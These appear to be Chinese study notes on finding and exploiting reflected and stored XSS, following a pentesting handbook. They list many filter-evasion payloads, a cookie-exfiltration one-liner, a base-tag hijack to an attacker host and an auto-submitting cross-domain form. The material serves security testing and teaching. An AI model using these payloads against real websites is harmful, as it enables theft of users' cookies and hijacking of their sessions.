漏洞使用某个设计的字符串，将其作其参数值，提交给应用程序页面上的每一个参数，监控应用程序的响应，但该字符串是否会出现在响应中，如果会的话，表示程序很可能存在 XSS 漏洞； 常见的漏洞验证字符串 “&gt;alert(document.cookie)\"，该字符串的要点在于通过第一个右尖括号，结果插入位置前面的 HTML 标签，然后引入一段 script 脚本； 为了避免 XSS 漏洞，许多应用程序会对用户的输入进行过滤，删除或转义其他的 \"\" 或者尖括号等字符；但是开发者的过滤机制经常有缺陷，攻击者可以通过对关键符号进行转义、插入空格、改变大小写、多层嵌套等方法来避开过滤，例如设计为下面这种类型的输入： 如果应用程序没有对输入进行过滤，则很容易通过输入并验证响应的方式，来实现漏洞检测的自动化；但如果应用程序对输入进行了过滤，由于过滤规则一开始是未知的，因此不能简单的通过比对来实现自动化检测，此时需要手工检测，并观察和猜测过滤规则，以找到规避的方式； 查找并利用反射型 XSS 漏洞在解析应用程序功能阶段，收集所有的用户输入点，针对每个输入点，系统性的实施以下步骤，以便找出哪些输入点最终会显示在界面上： 提交一个设计过的良性字符串（例如纯字母组成），确保该字符串之前不可能出现在程序中的任何位置； 确认该良性字符串在应用程序中出现的所有位置； 对于每个反射，记录其语法上下文； 提交针对语法上下文而设计的数据，尝试在响应中引入任意脚本； 如果提交的数据被阻止或者净化，导致脚本无法执行，尝试了解净化规则，以避开过滤机制； 确认用户输入的反射渗透测试步骤 选择任意一个字符串，确保它之前未出现在应用程序中的任何地方，并且让其仅包含字符，这样不会受到过滤规则的影响；提交该字符串，将其做为某个参数值，每次请求只针对一个参数； 针对每次请求，监管应用程序的响应，看其中是否出现同一个字符串；记录下所有满足条件的参数； 测试 GET 和 POST 请求；当在 POST 请求中发现 XSS 漏洞时，改变请求方法，确认是否可以通过 GET 请求实施相同的攻击； 除了请求参数外，还应该检查请求的消息头中的内容，是否也会出现在响应的内容中；如果会的话，意味着可以通过定制消息头，来利用 XSS 漏洞； 测试插入脚本的反射当找到反射位置后，务必手动检查每一个位置，以便确定该位置是否可以利用；针对该位置的上下文语法，针对性的设计输入，以便输入的脚本可以被执行； 例1：标签的属性值位置 字符串出现在 input 标签的 value 属性上，此时可以通过设计脚本，针对该处的上下文语法，结束 input 标签，并引入自定义的脚本； 另外，如果应用程序过滤输入，此时也可以不引入脚本，而是针对该位置的特点，在 input 标签中引入事件处理器，例如：\" onfocus=\"alert(1) 例2：Javascript 字符串如果输入做为变量值出现在响应的脚本中，则可以针对性的插入经过设计的字符串，让其截断原来的引号，改变语义，执行目标脚本； 注意保证插入位置后续的脚本语法正确，以便浏览器可以正确执行，有时可以通过插入 // 将后续的脚本变成注释； 例3：包含 URL 的属性 HTML 标签 的 href 属性原来支持插入脚本，之前一直不知道这个事情； 渗透测试步骤 针对在解析过程中记下的每一个漏洞位置，采取以下措施： 检查 HTML 源代码，确定受控制字符串的位置； 如果字符串出现在多个位置，则每个位置都可能是一个潜在的漏洞，应加以分析； 如果字符串出现在 HTML 中，则可以考虑如果设计字符串，让脚本得以执行； 向应用程序提交字符串，测试是否有效果，返回的响应是否与预期一致； 探查防御性过滤通常情况下，很多应用程序都会实施一定程度的输入过滤检查，因此并不一定能够得到原始的输入，但是，这些过滤机制或多或少也都会存在漏洞，应该进一步分析并加以利用； 常见的防御机制： 应用程序本身或者应用程序的防火墙，使用某种输入匹配筛查，发现了攻击意图，完全阻止了输入； 应用程序接受了输入，但对输入进行了净化或编码； 应用程序将输入截短为某个固定的最大长度； 避开基于匹配的过滤应用程序使用某种匹配机制，来检查输入中是否包含不合法的字符；此时，可轮流删除字符串的不同部分，看输入是否仍然被阻止，以便查明到底是哪部分的字符串，触发了检查；找到后，有针对性的设计输入，以便可以避开检查； 有四种常见的方法，可以用来在 HTML 页面中引入脚本代码； 插入脚本的方法标签插入 或者 标签，并利用这两个标签的 data 或 href 属性，来插入脚本，同时，对脚本进行编码（例如 base64），以避开检查 123&lt;object data=&quot;data:text/html, &lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/object&gt;&lt;object data=&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;&lt;a href=&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;点击这里&lt;/a&gt; 上面的 base64 字符串是对字符串 alert(1) 的编码； 事件很多标签都支持各种各样的事件，有些事情甚至不需要用户做任何交互即可执行，因此，只要将事件插入到标签的属性中，就可以让脚本得以执行； 1234567891011121314&lt;!-不需要交互需要可执行的脚本-&gt;&lt;xml onreadystatechange=alert(1)&gt;&lt;/xml&gt;&lt;style onreadystatechange=alert(1)&gt;&lt;/style&gt;&lt;iframe onreadystatechange=alert(1)&gt;&lt;/iframe&gt;&lt;object onerror=alert(1)&gt;&lt;/object&gt;&lt;object type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;/object&gt;&lt;img type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;input type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;isindex type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;/isindex&gt;&lt;script onreadystatechange=alert(1)&gt;&lt;/script&gt;&lt;bgsound onreadystatechange=alert(1)&gt;&lt;/bgsound&gt;&lt;body onbeforeactivate=alert(1)&gt;&lt;/body&gt;&lt;body onactivate=alert(1)&gt;&lt;/body&gt;&lt;body onfocusin=alert(1)&gt;&lt;/body&gt; 12345678&lt;input autofocus onfocus=alert(1)&gt;&lt;input autofocus onblur=alert(1)&gt;&lt;body onscroll=alert(1)&gt;&lt;/body&gt;&lt;video src=1 onerror=alert(1)&gt;&lt;/video&gt;&lt;audio src=1 onerror=alert(1)&gt;&lt;/audio&gt;&lt;!-HTML5 允许在结束标签中使用事件处理器-&gt;&lt;a&gt;&lt;/a onmousemove=alert(1)&gt; 伪源HTML 中有些标签的脚本也支持插入脚本，例如 object、a、iframe、embed 等； 12345678&lt;object data=javascript:alert(1)&gt;&lt;/object&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;embed src=javascript:alert(1)&gt;&lt;event-source src=javascript:alert(1)&gt;&lt;/event-source&gt; &lt;form id=&quot;test&quot;&gt; &lt;button form=&quot;test&quot; formaction=javascript:alert(1)&gt;&lt;/form&gt; HTML5 引入的 event-source 标签特别有用，因为该标签包含一个连字符，这意味着传统的正则表达式过滤机制需要支持它，从而引入了新的漏洞可能性； 动态样式HTML 支持在标签的 style 属性中使用表达式，来对标签的样式进行求值，这意味着可以利用该特性，插入恶意脚本 1&lt;x style=behavior:url(#default#time2) onbegin=alert(1)&gt;&lt;/x&gt; 避开过滤：HTML一些应用程序使用正规表达式，对于前面提到的各种插入办法的输入进行过滤，为了避开过滤，需要对输入进行模糊处理，常用的方法如下： 标签名称改变标签名称的大小写 1&lt;iMg onerror=alert(1) src=&quot;a&quot;&gt; 在任意位置插入 NULL 字节 123&lt;[%00]img onerror=alert(1) src=&quot;a&quot;&gt;&lt;/[%00]img&gt;&lt;i[%00]mg onerror=alert(1) src=&quot;a&quot;&gt;&lt;/i[%00]mg&gt;&lt;!-此处的 %XX 格式表示某个字符的 ASCII 的十六进制编码-&gt; NULL 常常可以有效应用防火墙的过滤，因为防火墙程序通常将 NULL 识别为字符串的终止符，从而无法发现 NULL 字节后的恶意插入； 直接修改标签名称，以避开针对标签名称的过滤 1&lt;x onclick=alert(1) src=a&gt;Click here&lt;/x&gt; 劫持 base 标签，base 标签用来指定脚本源的域名，因此，如果应用程序有使用 base，并且在 base 之后的脚本引用，都是相对路径，那么可以在原来的 base 之后，插入一个新的 base ，将其指向攻击者自己的服务器，这样后续的脚本就会改向攻击者的服务器请求脚本； 1234&lt;base href=&quot;http://mdattacker.net/badscripts/&quot;&gt;...&lt;script src=&quot;goodscript.js&quot;&gt;&lt;/script&gt;&lt;!-通常 base 标签仅允许出现在 head 部分，但少数浏览器如 firefox 允许出现在页面的任何位置-&gt; 使用一些特殊字符来替代空格，干扰过滤规则 1234567&lt;img/onerror=alert(1) src=a&gt;&lt;img[%09]onerror=alert(1) src=a&gt;&lt;img[%0d]onerror=alert(1) src=a&gt;&lt;img[%0a]onerror=alert(1) src=a&gt;&lt;img/&quot;onerror=alert(1) src=a&gt;&lt;img/&#x27;onerror=alert(1) src=a&gt;&lt;img/anyjunk/onerror=alert(1) src=a&gt; 即使在实施攻击时不需要任何标签属性，但应始终在标签名称后面添加一些多余的内容，因为这样可以避开一些简单的过滤，例如：&lt;img&#x2F;anyjunk&#x2F;onerror&#x3D;alert(1) src&#x3D;a&gt; 属性名称就像标签名称一样，也可以在属性的名称中使用 NULL 技巧，例如：&lt;img o[%00]nerror&#x3D;alert(1) src&#x3D;a&gt;，这样可以避开基于 on 开头的属性名称的过滤； 属性分隔符属性的分隔一般使用空格，但实际上也可以使用双引号或者单引号（IE 上还可以使用重音符）； 123&lt;img onerror=&quot;alert(1)&quot;src=a&gt;&lt;img onerror=&#x27;alert(1)&#x27; src=a&gt;&lt;img onerror=`alert(1)` src=a&gt; 通过使用引号或者重音符来分隔属性，并在标签名称后面使用特殊符号来替代空格，则可以实现整个输入都没有使用任何空格的情况，从而避开一些简单的过滤 1&lt;img/onerror=&quot;alert(1)&quot;src=a&gt; 属性值属性值同样也可以使用 NULL 技巧，并且还可以使用 HTML 编码字符对输入进行模糊处理 1234&lt;img onerror=a[%00]alert(1) src=a&gt;&lt;img onerror=a&amp;#x6c;ert(1) src=a&gt;&lt;!-以下使用 HTML 编码对 javascript 伪源进行了编码-&gt;&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29;&gt; 在使用 HTML 编码时，应注意到，浏览器支持多种编码变体，例如可以使用十进制或者十六进制格式，添加多余的前导零，并省略结尾分号等； 123456789&lt;!-十六进制，前导零-&gt;&lt;img onerror=a&amp;#x06c;ert(1) src=a&gt;&lt;img onerror=a&amp;#x006c;ert(1) src=a&gt;&lt;img onerror=a&amp;#x0006c;ert(1) src=a&gt;&lt;!-十进制，前导零，省略分号-&gt;&lt;img onerror=a&amp;108;ert(1) src=a&gt;&lt;img onerror=a&amp;#0108;ert(1) src=a&gt;&lt;img onerror=a&amp;#108ert(1) src=a&gt;&lt;img onerror=a&amp;#0101ert(1) src=a&gt; 标签括号有些应用程序会对过滤后的输入进行不必要的 HTML 解码，例如 123456&lt;!--实际输入如下，没有使用任何的括号，并使用 %25 和 %20 来代替 % 和空格--&gt;%253cimg%20onerror=alert(1)%20src=a%253e&lt;!--第一层解码，%25 和 %20 被转换为实际的百分符和空格，变成如下--&gt;%3cimg onerror=alert(1) src=a%3e&lt;!--由于应用程序会对输入进行 HTML 解码，导致最终呈现在浏览器中的输入变成如下字符--&gt;&lt;img onerror=alert(1) src=a&gt; 有些应用程序会将不常见的 Unicode 字符转换为相近的 ASCII 字符进行处理，例如双尖括号会转移为单尖括号，从而有机会避开过滤规则； 12&lt;&lt;img onerror=alert(1) src=a&gt;&gt;%u00ABimg onerror=alert(1) src=a%u00BB 很多过滤规则的算法比较简单，例如简单的匹配起始和结束的尖括号，提取内容，并将其与黑名单进行比较，来识别 HTML 标签，此时可以使用多余的括号来避开过滤（前提是浏览器接受这种多余的括号） 1&lt;&lt;script&gt;alert(1);//&lt;&lt;/srcipt&gt; 由于历史原因，有大量的合法的网站，使用不规范的 HTML 格式，而浏览器为了尽可能的兼容它们以进行正确的显示，导致浏览器接受各种不合法的 HTML 内容格式，并自动将其转换为规范的格式，这就为漏洞留下了大量的机会；可使用浏览器自带的工具，如“查看生成的源”，来查看浏览器如何转换一些不规范的格式； 字符集使用不同的字符集来编码输入，常常可以避开过滤规则，不过它的挑战在于如何让浏览器按正确的字符集进行解析，一般需要能够控制 HTTP 响应头，例如 Content-Type 属性，或者对应的 HTML 元标签； 1&lt;!--对 &lt;script&gt;alert(document.cookie)/&lt;/script&gt; 在不同字符集下的编码--&gt; 如果应用程序默认支持使用多字节的字符集，例如 Shift-JIS，则可以在输入中使用在该字符集中具有特殊意义的字符，来避开输入过滤 例如某个应用程序支持 Shift-JIS 字符集，并在返回的响应中包括如下内容： 12&lt;!--用户输入1 和 用户输入2 两个位置可以根据用户输入显示的内容--&gt;&lt;img src=&quot;image.gif&quot; alt=[&quot;用户输入位置1&quot;] /&gt; ...[&quot;用户输入位置2&quot;] 假设应用程序的过滤规则限制了在用户输入位置1使用引号，并在用户输入位置2限制使用尖括号，则此时可以将输入1和输入2分别设计为如下： 输入1： %f0 输入2：”onload&#x3D;alert(1); 根据 Shift-JIS 字符集，%f0 后面的引号，将被解析为 %f0 的组成部分，从而使用原本 HTML 属性中的引号失去作用，之后一直到输入2的位置的引号才完成配对，从而成功的插入了 onload&#x3D;alert(1) 语句； 较少用的字符集包括：Shift-JIS、EUC-JP、BIG5 等； 避开过滤：脚本代码有些过滤规则会对输入中的 javascript 敏感字符进行过滤，例如分号、圆括号、圆点等；此时需要对这些关键符号先进行模糊处理才行，常见的处理办法如下： 转义javascript 支持多种转义方法，因此可以使用这些方法，对关键字符进行转义处理； 12&lt;!--对字母 L 进行 Unicode 转义 --&gt;&lt;script&gt;a\\u006cert(1);&lt;/script&gt; 如果能够使用 eval 命令，则可以将需要执行的代码，弄成字符串，传给 eval 命令实现执行； 12345&lt;script&gt;eval(&#x27;a\\u006cert(1)&#x27;);&lt;/script&gt; // Unicode 转义&lt;script&gt;eval(&#x27;a\\x6cert(1)&#x27;);&lt;/script&gt; // 十六进制转义&lt;script&gt;eval(&#x27;a\\154ert(1)&#x27;);&lt;/script&gt; // 十进制转义&lt;script&gt;eval(&#x27;a\\l\\ert&#x27;(1\\);&lt;/script&gt; // 字符串中带转义符将会被忽略 动态构建字符串123&lt;script&gt;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;;&lt;/script&gt;&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41));&lt;/script&gt;&lt;script&gt;eval(atob(&#x27;amF2YXNjcmlwdDphbGVydCgxKQ&#x27;));&lt;/script&gt; // Base64 编码的方式 替代 eval 的方法12&lt;script&gt;&#x27;alert(1)&#x27;.replace(/.+/,eval)&lt;/script&gt; // 字符串的内置函数+正则替换&lt;script&gt;function::[&#x27;alert&#x27;](1)&lt;/script&gt; 替代圆点12&lt;script&gt;alert(document[&#x27;cookie&#x27;]&lt;/script&gt; // 使用中括号访问对象属性的方法&lt;script&gt;with(document)alert(cookie)&lt;/script&gt; // 使用 with 语法 组合多种技巧例如先使用 Unicode 对关键字进行转义，然后再使用 HTML 编码将 Unicode 用到的反斜杠进行编码，以避开过滤； 1&lt;img onerror=eval(&#x27;al&amp;#x5c;u0065rt(1)&#x27;) src=a&gt; // 此处对 alert 单词中的 e 字母先用 Unicode 进行转义，然后再将 Unicode 转义中用到反斜杠进行 HTML 编码， 此外还可以对 onerror 属性值中的任何字符进行 HTML 编码，以便进一步隐藏攻击； 很多针对 Javascript 的过滤规则一般会核查 Javascript 中使用到的关键字符，例如引号、点号、括号等，对这些符号使用 HTML 编码后，就可以避开过滤规则； 使用 VBScript通常 XSS 攻击都是使用 Javascript 语言来插入恶意脚本，但是有些浏览器除了支持 Javascript 外，还支持其他语言，例如 IE 浏览器支持 VBSript；因此，如果存在此种情况，则攻击者可以根据 VBSript 的语法语法特征来设计攻击脚本，以避开过滤规则； 1234&lt;script language=vbs&gt;MsgBox 1&lt;/script&gt;&lt;img onerror=&#x27;vbs:MsgBox 1&#x27; src=a&gt;&lt;img oneeror=MsgBox+1 language=vbs src=a&gt; // Msgbox 之后接的加号表示空格，用来针对空格的过滤// 以上例子的 vbs 字样，同时还可以替换为 vbsript 字样，二者的效果是一样 VBSript 的一些特点： 不使用括号也可以实现函数的调用（可避开针对括号的过滤）； 不区分大小写（Javascript 语法规则要求表达式需要使用小写，不支持大写，可绕开进行大写转换的净化规则）； 组合 Javascript 和 VBSript可以设计从 Javascript 中调用 VBScript，或者反过来也行，从而增加攻击的复杂度，以避开过滤规则； 12345&lt;script&gt;execScript(&quot;MsgBox 1&quot;, &quot;vbscript&quot;);&lt;/script&gt;&lt;script language=vbs&gt;execScript(&quot;alert(1)&quot;)&lt;/script&gt;// 以下是一个嵌套使用两种脚本的复杂示例&lt;script&gt;execScript(&#x27;execScript&quot;alert(1)&quot;, &quot;javascript&quot;&#x27;, &quot;vbscript&quot;);&lt;/script&gt; 由于 VBSript 不区分大小写，即使输入被全部转换成大写后，仍然可以被浏览器执行，这意味着如果想实现 Javascript 的调用，可以使用 VBSript 脚本，调用内置的 LCASE 函数，将被净化规则转换后的大写，再次转换成小写来实现； 12&lt;SCRIPT LANGUAGE=VBS&gt;EXECSCRIPT(LCASE(&quot;ALERT(1)&quot;))&lt;/SCRIPT&gt;&lt;IMG ONERROR=&quot;VBS:EXECSCRIPT LCASE(&#x27;ALERT(1)&#x27;)&quot; SRC=A&gt; 使用经过编码的脚本早期微软在 IE 浏览器中，使用某种定制的脚本编码，对脚本进行模糊处理，以防止用户查看 HTML 页面的源代码，但后面该编码被破解了，导致了额外的一个漏洞，即攻击者可以根据该编码规则，先对输入进行模糊处理，以避开过滤规则，然后输入最终又会被浏览器解码成正确的脚本内容； 避开净化 净化是一种防守策略，不过貌似直接拒绝请求，并根据情况加入黑名单不是更好？ 净化是一种应对攻击的常用策略，其中一种常见的方法是将输入进行 HTML 编码，这样就可以避免输入的脚本被浏览器执行；有时候，应用程序甚至会删除输入中的特定字符，以清除其中可能包含的恶意内容；此时需要做两件事情： 了解程序对哪些字符实施了净化规则，然后组合多种技巧避开它们； 了解输入内容被净化后，余下的内容有无可能实施攻击 净化算法经常有漏洞，例如： 1234567891011121314151617181920212223242526// 只替换了第一个匹配值输入：&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt;alert(1)&lt;/script&gt;// 没有递归输入：&lt;src&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt;alert(1)&lt;/script&gt;// 对多个关键字实施净化时，使用固定的处理顺序，因此攻击者可以利用该顺序，让第一个步骤未能找到匹配值，然后利用第二个步骤的净化结果，得到想要插入的正确脚本输入：&lt;src&lt;object&gt;ipt&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt;alert(1)&lt;/script&gt;// 净化规则会转义引号，但未转义反斜杠本身，因此，攻击者可以在输入中加入反斜杠，对净化规则添加的反斜杠进行转义，使其失效；输入：var a = foo\\&quot;; alert(1); //结果：var a = &quot;foo\\\\&quot;; alert(1);//&quot;;// 未处理尖括号，攻击者有机会利用转义会废弃原脚本，原因：浏览器会优先解析 HTML 标签，再处理 js 脚本输入：&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt; var a = &quot;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;// 虽然此处变量 a 的声明中只包含1个引号，不符合 js 语法，可能会出现报错，但问题不大，因为浏览器会跳过，直接执行下一段脚本// 如果注入的位置处于事件中，则可以使用 HTML 编码来避开净化位置 foo：&lt;a href=&quot;#&quot; onclick=&quot;var a = &#x27;foo&#x27;&quot;;&gt;&lt;/a&gt;输入：foo&amp;apos;; alert(1); //直接结果：&lt;a href=&quot;#&quot; onclick=&quot;var a = &#x27;foo&amp;apos;; alert(1); //&#x27;&quot;&gt;&lt;/a&gt;解码后结果：&lt;a href=&quot;#&quot; onclick=&quot;var a = &#x27;foo&quot;; alert(1); //&#x27;&quot;&gt;&lt;/a&gt; 一些净化规则的设计者认为对用户的输入进行 HTML 编码，可以规避 XSS 攻击，但由于浏览器在编译 HTML 文本前，会先对其进行 HTML 解码的动作，因此，规避攻击的意图不一定可以实现； 避开长度限制方法一：使用尽可能短的脚本 1234567// 将 cookie 传送至主机名为 a 的服务器open(&quot;//a/&quot;+document.cookie)// 从主机名为 a 的服务器加载一段脚本&lt;script src=http://a&gt;&lt;/script&gt;注：以上的服务器只能针对局域网内的机器，如果是因特网上的机器，只提供主机名还不够 有一些第三方工具可以用来尽量缩短有效的 js 代码，例如 javascript packer 工具 方法二：将一段攻击脚本拆分成多段，分散在同一个页面的不同位置 123456789101112// 源代码，接收请求 URL：https://sample.com/account.php?page_id=244&amp;seed=123&amp;mode=normal&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;244&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;seed&quot; value=&quot;123&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;normal&quot;&gt;// 攻击者可以将请求参数设计为如下格式：https://sample.com/account.php?page_id=&quot;&gt;&lt;script&gt;/*&amp;seed=*/alert(document.cookie);/*&amp;mode=*/&lt;/script&gt;得到的结果如下：&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;&quot;&gt;&lt;script&gt;/*&gt;&lt;input type=&quot;hidden&quot; name=&quot;seed&quot; value=&quot;*/alert(document.cookie);/*&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;*/&lt;/script&gt;&quot;&gt;以上结果将执行 &quot;alert(document.cookie);&quot;，同时该脚本前后位置的部分变成了 HTML 注释； 当使用了长度限制的过滤后，例如将名称限制在 12 个字符以内，开发者有可能觉得如此短的长度，不可能实施有效的 XSS 攻击，因此没有进一步对该输入进行净化过滤，从而攻击者有机会将攻击荷载分散到不同的多个位置，然后其组合起来后，将有效的注释掉两个位置中间的部分； 有可能攻击者在某个中间位置，因为没有长度限制，实施了很严格的净化过滤，但由于前后位置已经被攻陷，导致中间位置的净化完全失去作用； 方法三：将反射型漏洞转化成 DOM 型漏洞 1234567// 假设某个反射型漏洞存在长度限制，攻击者可以在合理的长度范围内，注入一段脚本，让其访问另外一个标签节点的值，并执行它&lt;script&gt;eval(location.hash.slice(1)&lt;/script&gt; // 该段脚本只有45个字符，但它可以在页面中生成一个 DOM 漏洞，然后攻击者再利用生成的 DOM 漏洞来创造机会，执行位于片断字符串中的另一段脚本；完整的请求为：http://sample.com/error/5/error.ashx?message=&lt;script&gt;eval(location.hash.substr(1)&lt;/script&gt;#alert(&#x27;long script insert here...&#x27;)或者为：http://sample.com/error.ashx?message=&lt;script&gt;eval(unescape(location))&lt;/script&gt;#%0Aalert(&#x27;long script insert here...&#x27;)location 代表的值先被 HTML 解码，然后传递给 eval 命令，整个 URL 作为有效的 javascript 执行；其中 http: 协议前缀作为代码标签，协议前缀后的 // 变成了单行注释的起始点，%0A 经过解码后，变成了换行符，表示注释结束，之后 alert 的代码被执行 实施有效的 XSS 攻击将攻击扩展到其他页面假如在某个页面发现了一个 XSS 漏洞，但该页面可能并不包含敏感数据，此时需要扩展该漏洞攻击范围。常见方法为利用该漏洞，先传送一个攻击脚本，该脚本用来实现在用户的浏览器中持续运行，监控并提取用户的数据；之后，当用户进入到包含敏感数据的页面时，就可以提取需要的数据了； 例如可以通过创建一个包含整个浏览器窗口的 iframe，然后在该 iframe 中重新加载当前页面；之后用户的浏览操作，实际都是在当前 iframe 中运行，并没有切换页面，从而使得攻击脚本延长了生命周期，得到始终运行； 修改请求方法很多应用程序经常同时接受 GET 和 POST 请求，但开发者并没有意识到这点，只将过滤规则适用在其中一个请求上，另外一种请求并没有使用过滤，因此，攻击者有机会利用另外一种请求要实现攻击； 通过 cookie 利用 XSS 漏洞 有些开发者利用 cookie 来保存用户相关的数据，从而实现定制化的效果，但这样其实很危险，因为这意味着攻击者可以提交设计好的字符串，然后让其出现在 cookie 中；之后应用程序的某个功能会去读取该 cookie 值，从而触发恶意脚本的执行； 另外有些应用程序可能还会允许在 URL 中设置与 cookie 同名的参数，然后会读取该参数值，导致漏洞； 一些浏览器使用的扩展技术（如 Flash）可能存在各种漏洞，但没有及时修复，通过利用这些插件本身的漏洞，就可能实现攻击； 在有漏洞的 A 页面设置一个永久性的 cookie 值，然后在 B 页面，当 cookie 被读取时，脚本得以执行； cookie 攻击可行的本质原因在于 cookie 是跨页面存在的，因此它可以用来在不同页面之间传递数据； 通过 Referer 消息头利用 XSS 漏洞攻击者自建一台服务器，放上目标应用程序的 URL，诱使用户点击；当用户点击后，发给目标程序请求消息头中的 Referer 字段，将自动设置为攻击者的服务器，此时攻击者有机会在该 Referer 字段中放入脚本，当目标程序读取它时，触发执行； 很多应用程序会尝试读取请求的 Referer 字段来实现一些功能，例如显示访问来源； 通过非标准请求和响应内容利用 XSS 漏洞有些应用程序在脚本中使用 XMLHttpRequest 来发送请求，而无须刷新页面；之后在收到服务端的响应内容后，通过 AJAX 提取内容，并改写 DOM 来实现页面局部内容的变化； 跨域请求：用户在 A 域名的页面下，发起访问 B 域名的请求；表单是允许的，但是 XHR 是不允许的，除非服务端实现接口；原理很简单：当浏览器发现用户发起向 B 网站的请求时，就向 A 域名的服务器发送一个确认，如果 A 服务器返回的响应中，在报头的 Access-Control-Allow-Origin 字段指示 B 域名是其允许的访问范围，那么浏览器就会向 B 域名发出请求；如果不允许，则浏览器拒绝请求，抛出一个错误； 通过在 HTTP 报头的 Content-Type 字段指定消息类型，浏览器支持直接处理响应内容，而无须由脚本进行处理；这种情况下，通常注入脚本代码的方式将失效，因为脚本没有机会操作响应内容； 虽然 XHR 不允许跨域请求，但传统的表单则支持向任意的域名发起请求，因此，可以使用表单来发送数据，从而避开 XHR 的限制； 将表单的 enctype 属性值设置为 text&#x2F;plain，可以实现在 HTTP 请求主体中跨域传送数据；其原理在于，当浏览器发现某个表单的 enctype 属性值为 text&#x2F;plain 时，它将按如下的方式处理该表单的数据： 在请求中隔行传送每个表单参数； 使用等号分隔每个参数的键名和键值； 不对参数名称和值进行 URL 编码； 注：不是所有的浏览器都遵守上面的做法，需要提前确认；已知浏览器：IE、Firefox、Opera 等； 这里最大的一个特性在于，浏览器会为键值地自动添加等号，因此攻击者可以利用这个特性来构建数据；假设需要提交的数据格式，本身包含有至少一个等号，那么我们可以将等号左边的数据做为键名，等号右边的数据做为键值，等号则由浏览器自动添加，三者合一，最终形成 XML 数据格式； 此处的要点在于利用表单的特性，来构建 XML 格式的请求主体； 123456// 传送跨域的 XML 请求// 将表单的 enctype 属性值设置为 text/plain，可以实现在 HTTP 请求主体中跨域传送数据&lt;form enctype=&quot;text/plain&quot; action=&quot;http://sample.com/vuln.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;&lt;?XML version&#x27; value=&#x27;&quot;1.0&quot;?&gt;&lt;data&lt;param&gt;foo&lt;/param&gt;&lt;/data&gt;&#x27;&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt; 如果在包含非标准内容的请求中发现了类似 XSS 漏洞的行为，则可以通过将消息头 Content-Type 属性的值设置为 text&#x2F;plain，然后查看应用程序是否依然能够正常响应；如果可以，说明存在 XSS 攻击漏洞；如果不行，则漏洞无法利用； 当响应由浏览器直接执行时，浏览器一般会跟消息头中的 Content-Type 规范，对响应内容进行处理；此时如果想要构建能够触发浏览器执的脚本的响应，一般来说需要利用内容类型的一些特点，例如 XML 支持在中间插入 HTML 内容（使用 XML 标签定义一个 XHTML 的命名空间）； 攻击浏览器 XSS 过滤器很多浏览器都内置了防范 XSS 攻击的功能，它们会监控请求和响应，检查其中的内容是否携带 XSS 攻击内容，如果有的话，会对其进行修改，以阻止攻击； 虽然浏览器的内置功能确实可以阻止绝大多数的标准 XSS 攻击，为攻击者带来很大的障碍，但有意思的是，过滤规则本身也会引入新的漏洞，给攻击者新的机会；一些常见的避开办法如下： 过滤器经常只检查参数值，只没有检查参数名称；这意味着如果参数名称会回显的话，那么攻击者就可以将脚本注入到参数名称中，避开过滤； 过滤器单独检查每个参数值，但是攻击者可以将攻击脚本分散在多个参数中；当这些参数同时回显时，就能够组合成完整的攻击脚本； 出于性能考虑，过滤器仅检查跨域请求，没有检查由用户点击 URL 发出的本地请求，攻击者可以在内容中放入恶意链接，等待用户点击； 利用浏览器本身的非正常行为： 当存在多个同名参数时，IE 会将它们串联起来，因此攻击者可以将攻击荷载分散在多个参数中，从而避开 IE 针对单个参数的过滤；但最终串联起来后又能实现预期效果； 过滤器通常基于对输入和输出进行匹配检查，确定二者存在关联；因此攻击者可以故意在输入中放入应用程序的现有脚本，从而利用过滤器将现有脚本进行净化，让其失去作用，例如破坏应用程序在客户端的案例防御功能； 查找并利用保存型 XSS 漏洞保存型漏洞的探查大体上和反射型类似，但二者还是有如下一些重要的区别 渗透测试步骤 反射型漏洞能够直接从应用程序的响应内容中发现，保存型则要曲折一点；当在某个位置提交一个预设输入值的请求后，需要在整个程序的范围去查找该输入会出现在什么地方，因为它不一定直接出现在该请求的响应内容中；同一个输入值有可能出现在很多个不同的页面，并且每个页面可能使用了不同的过滤保护方法，因此需要对每个出现的位置进行单独的分析； 重点检查管理员可以访问的所有应用程序区域，并确认其中是否存在某些内容可以由非管理员用户提交；例如很多应用程序会提供日志浏览功能，这种功能很容易存在漏洞，攻击者可以通过提交包含恶意 HTML 的日志记录，等待管理员浏览时触发； 某些应用程序的功能是由多个步骤组成的，因此单个步骤中提交的数据要最终成功保存并生效，需要彻底完全所有步骤，再判断漏洞是否存在，仅单个步骤不准确； 跟探查反射型漏洞时一样，在提交输入时，除了尝试每一个参数外，还应该包括每一个消息头；同时，在探查保存型漏洞时，还应注意应用程序是否接收一些带外通道数据的功能，这些功能很很可能也是攻击切入点； 如果应用程序允许上传和下载文件，则应探查该功能是否存在保存型漏洞； 发挥想象力，找到各种可能提交输入，并出现在其他用户界面的办法；例如某些应用程序的搜索功能会显示搜索频率最高的关键字，攻击者通过多次提交相同的搜索关键字，即可以引入攻击荷载； 在探查完位置后，接下来要考虑两个事情： 如果设计荷载，让其出现在目标用户的界面上，实现预期目的； 如果避开过滤 